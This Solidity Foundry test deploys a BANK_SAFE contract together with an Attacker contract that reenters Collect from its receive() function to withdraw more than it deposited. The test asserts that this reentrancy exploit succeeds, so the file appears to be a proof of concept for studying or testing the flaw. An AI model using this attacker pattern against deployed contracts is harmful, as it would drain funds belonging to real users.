
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new BANK_SAFE();

        _attacker = new Attacker(address(_contractUnderTest));

        // Initialize BANK_SAFE so min sum and log cannot be changed later
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.SetLogFile(address(new LogFileMock()));
        _contractUnderTest.Initialized();
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.1 ether);
        vm.assume(attackVal < type(uint128).max / 4);

        vm.deal(address(_contractUnderTest), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);
        vm.deal(address(this), attackVal * 4);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = BANK_SAFE(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        require(msg.value == val, "Incorrect setup value");

        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        victim.Collect(val);

        uint256 finalBalance = address(this).balance;
        if (finalBalance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }

    fallback() external payable {}
}

contract LogFileMock {
    function AddMessage(address, uint256, string memory) public {}

    receive() external payable {}

    fallback() external payable {}
}
